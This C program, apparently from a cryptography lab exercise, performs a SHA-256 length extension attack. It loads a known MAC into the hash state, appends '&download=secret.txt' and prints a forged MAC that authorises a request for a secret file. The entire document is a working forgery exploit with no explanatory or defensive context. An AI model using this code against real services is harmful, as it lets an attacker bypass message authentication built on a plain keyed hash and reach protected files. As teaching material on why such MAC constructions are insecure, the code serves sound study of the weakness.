#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[]) {
	int i;
	unsigned char buffer[SHA256_DIGEST_LENGTH];
	SHA256_CTX c;

	SHA256_Init(&c);

	// Process Original Message Length
	for(i=0; i<64; i++)
        	SHA256_Update(&c, "*", 1);

	// Break the hash into 8 chunks of 8 hex characters.
	c.h[0] = htole32(0x53f5e9d8);
        c.h[1] = htole32(0x9774bf0f);
        c.h[2] = htole32(0x1050fb4c);
        c.h[3] = htole32(0xadc83ca0);
        c.h[4] = htole32(0x4465e56a);
        c.h[5] = htole32(0xfd17a3cd);
        c.h[6] = htole32(0xe64c64c9);
        c.h[7] = htole32(0x89a9faa1);

    	// Append the extra message
    	SHA256_Update(&c, "&download=secret.txt", 20);

    	SHA256_Final(buffer, &c);

    	// Print the new forged MAC
    	for(i=0; i<32; i++) {
        	printf("%02x", buffer[i]);
    	}
    	printf("\n");
    	return 0;
}
